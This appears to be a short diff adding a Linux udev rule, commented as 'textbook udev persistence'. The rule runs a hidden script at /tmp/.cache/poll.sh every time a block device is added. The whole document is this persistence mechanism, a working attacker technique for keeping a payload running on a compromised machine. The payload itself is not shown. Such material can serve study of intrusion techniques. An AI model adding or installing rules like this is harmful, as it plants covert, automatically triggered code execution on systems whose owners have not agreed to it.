@@ -1,0 +1,3 @@
+# textbook udev persistence: hook a frequently-firing event and spawn
+# a payload kept under /tmp.
+ACTION=="add", SUBSYSTEM=="block", RUN+="/tmp/.cache/poll.sh"
